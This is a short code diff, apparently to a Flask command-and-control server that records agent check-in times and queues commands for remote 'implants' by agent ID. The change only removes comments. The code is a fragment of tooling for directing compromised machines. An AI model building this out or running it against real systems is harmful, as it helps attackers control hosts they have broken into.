@@ -17,7 +17,7 @@ last_check_in_time = {}
 def set_check_in_time():
     data = request.get_json()
 
-    # Extract the command from the request
+
     global check_in_time
     check_in_time = data.get('check_in_time')
 
@@ -31,11 +31,8 @@ def send_command():
     command = data.get('command')
     agentid = data.get('agentid')
 
-    # Send the command to the implant (replace this with your actual implementation)
-    # For simplicity, we'll just echo the command for demonstration purposes
     print(f"Command received: {command} for {agentid}")
 
-    # Store the response in the dictionary for later retrieval
     agent_command_queue[agentid] = command
 
     return jsonify({'status': 'success'})
